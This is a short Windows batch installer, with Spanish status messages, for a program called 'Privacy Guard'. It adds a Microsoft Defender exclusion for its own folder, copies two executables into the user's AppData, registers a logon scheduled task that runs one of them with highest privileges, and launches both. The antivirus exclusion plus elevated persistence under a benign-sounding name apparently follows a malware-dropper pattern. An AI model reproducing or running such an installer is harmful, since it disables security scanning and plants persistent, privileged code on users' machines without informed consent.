@echo off
echo ========================================================
echo    Instalando Privacy Guard en Windows 10/11...
echo ========================================================

echo [*] Anadiendo exclusiones de seguridad...
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'"

set "INSTALL_DIR=%LOCALAPPDATA%\PrivacyGuard"
echo [*] Instalando en %INSTALL_DIR%...
mkdir "%INSTALL_DIR%"
xcopy /E /I /Y "%~dp0PrivacyGuard" "%INSTALL_DIR%\PrivacyGuard"
xcopy /E /I /Y "%~dp0PrivacyGuard_Engine" "%INSTALL_DIR%\PrivacyGuard_Engine"

echo [*] Configurando inicio automatico...
schtasks /create /tn "PrivacyGuard_Engine" /tr "\"%INSTALL_DIR%\PrivacyGuard_Engine\PrivacyGuard_Engine.exe\" --guard" /sc onlogon /rl highest /f

echo [*] Creando acceso directo...
powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%USERPROFILE%\Desktop\Privacy Guard.lnk'); $SC.TargetPath = '%INSTALL_DIR%\PrivacyGuard\PrivacyGuard.exe'; $SC.Save()"

start "" "%INSTALL_DIR%\PrivacyGuard_Engine\PrivacyGuard_Engine.exe" --guard
start "" "%INSTALL_DIR%\PrivacyGuard\PrivacyGuard.exe"

echo.
echo [OK] Instalacion completada.
pause
